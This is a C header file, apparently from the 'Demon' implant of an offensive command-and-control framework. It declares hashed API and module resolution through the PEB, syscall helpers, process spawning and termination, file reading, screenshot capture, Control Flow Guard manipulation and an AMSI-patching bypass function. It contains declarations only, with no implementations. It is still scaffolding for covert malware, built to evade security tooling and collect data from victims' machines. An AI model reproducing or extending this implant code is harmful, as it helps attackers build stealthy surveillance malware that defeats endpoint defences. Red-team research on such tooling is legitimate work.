#ifndef DEMON_WIN32_H
#define DEMON_WIN32_H

#include <tlhelp32.h>
#include <winsock2.h>
#include <mscoree.h>
#include <shellapi.h>
#include <winhttp.h>

#include <Common/Macros.h>
#include <Common/Native.h>

#include <Core/Syscalls.h>

#include <iphlpapi.h>
#include <lm.h>

#define HASH_KEY 5381
#define WIN_FUNC(x) __typeof__(x) * x;

#define DEREF( name )       *( UINT_PTR* ) ( name )
#define DEREF_32( name )    *( DWORD* )    ( name )
#define DEREF_16( name )    *( WORD* )     ( name )

#define PIPE_BUFFER_MAX 0x10000 - 1
#define MAX( a, b ) ( ( a ) > ( b ) ? ( a ) : ( b ) )
#define MIN( a, b ) ( ( a ) < ( b ) ? ( a ) : ( b ) )

typedef struct
{
    PVOID TebInformation;
    ULONG TebOffset;
    ULONG BytesToRead;
} THREAD_TEB_INFORMATION;

typedef struct _BUFFER
{
    PVOID  Buffer;
    UINT32 Length;
} BUFFER, *PBUFFER;

typedef struct _ANONPIPE
{
    HANDLE StdOutRead;
    HANDLE StdOutWrite;
} ANONPIPE, *PANONPIPE;

typedef enum _PS_ATTRIBUTE_NUM
{
    PsAttributeParentProcess = 0  /*0x0*/,
    PsAttributeDebugObject   = 1  /*0x1*/,
    PsAttributeToken         = 2  /*0x2*/,
    PsAttributeClientId      = 3  /*0x3*/,
    PsAttributeTebAddress    = 4  /*0x4*/,
    PsAttributeImageName     = 5  /*0x5*/,
    PsAttributeImageInfo     = 6  /*0x6*/,
    PsAttributeMemoryReserve = 7  /*0x7*/,
    PsAttributePriorityClass = 8  /*0x8*/,
    PsAttributeErrorMode     = 9  /*0x9*/,
    PsAttributeStdHandleInfo = 10 /*0xA*/,
    PsAttributeHandleList    = 11 /*0xB*/,
    PsAttributeMax           = 12 /*0xC*/
}PS_ATTRIBUTE_NUM, *PPS_ATTRIBUTE_NUM;

typedef struct _PROC_THREAD_ATTRIBUTE_ENTRY
{
    ULONG_PTR  Attribute;
    ULONG_PTR  Size;
    ULONG_PTR* pValue;
    ULONG_PTR  Unknown;
} PROC_THREAD_ATTRIBUTE_ENTRY, *PPROC_THREAD_ATTRIBUTE_ENTRY;

typedef struct __attribute__((packed))
{
    ULONG ExtendedProcessInfo;
    ULONG ExtendedProcessInfoBuffer;
} EXTENDED_PROCESS_INFORMATION, *PEXTENDED_PROCESS_INFORMATION;

typedef struct _PROC_THREAD_ATTRIBUTE_LIST
{
    ULONG_PTR                   Length;
    PROC_THREAD_ATTRIBUTE_ENTRY Entry;
} PROC_THREAD_ATTRIBUTE_LIST, *PPROC_THREAD_ATTRIBUTE_LIST;

typedef PSYSTEM_PROCESS_INFORMATION  PSYS_PROC_INFO;
typedef SECURITY_QUALITY_OF_SERVICE  SEC_QUALITY_SERVICE;
typedef OBJECT_ATTRIBUTES            OBJ_ATTR;
typedef OBJECT_ATTRIBUTES            OBJ_ATTR;
typedef PROC_THREAD_ATTRIBUTE_LIST   THD_ATTR_LIST;
typedef PROCESS_INFORMATION          PROC_INFO;

DWORD HashStringA(
    IN PCHAR String
);

ULONG HashEx(
    IN PVOID String,
    IN ULONG Length,
    IN BOOL  Upper
);

PVOID LdrFunctionAddr(
    IN PVOID Module,
    IN ULONG   Hash
);

UINT32 GetSyscallSize(
    VOID
);

PVOID LdrModulePeb(
    IN DWORD hash
);

PVOID LdrModulePebByString(
    IN LPWSTR Module
);

PVOID LdrModuleSearch(
    IN LPWSTR ModuleName
);

PVOID LdrModuleLoad(
    IN LPSTR ModuleName
);

BOOL ProcessCreate(
    IN  BOOL                 x86,
    IN  LPWSTR               App,
    IN  LPWSTR               CmdLine,
    IN  DWORD                Flags,
    OUT PROCESS_INFORMATION* ProcessInfo,
    IN  BOOL                 Piped,
    IN  PANONPIPE            AnonPipes
);

BOOL ProcessTerminate(
    IN HANDLE hProcess,
    IN DWORD  Pid
);

BOOL ProcessIsWow(
    IN HANDLE hProcess
);

HANDLE ProcessOpen(
    IN DWORD Pid,
    IN DWORD Access
);

NTSTATUS ProcessSnapShot(
    OUT PSYSTEM_PROCESS_INFORMATION* Buffer,
    OUT PSIZE_T Size
);

BOOL ReadLocalFile(
    IN  LPCWSTR FileName,
    OUT PVOID*  FileContent,
    OUT PDWORD  FileSize
);

BOOL WinScreenshot(
    OUT PVOID*  ImagePointer,
    OUT PSIZE_T ImageSize
);

BOOL AnonPipesInit(
    OUT PANONPIPE AnonPipes
);

VOID AnonPipesRead(
    IN PANONPIPE AnonPipes,
    IN UINT32    RequestID
);

BOOL PipeWrite(
    IN HANDLE Handle,
    IN PBUFFER Buffer
);

BOOL PipeRead(
    IN  HANDLE Handle,
    OUT PBUFFER Buffer
);

BOOL CfgQueryEnforced(
    VOID
);

VOID CfgAddressAdd(
    IN PVOID ImageBase,
    IN PVOID Function
);

BOOL EventSet(
    IN HANDLE Event
);

BOOL BypassPatchAMSI(
    VOID
);

ULONG RandomNumber32(
    VOID
);

BOOL RandomBool(
    VOID
);

ULONG64 SharedTimestamp(
    VOID
);

VOID SharedSleep(
    ULONG64 Delay
);

VOID ShuffleArray(
    IN OUT PVOID* array,
    IN     SIZE_T n
);

#endif
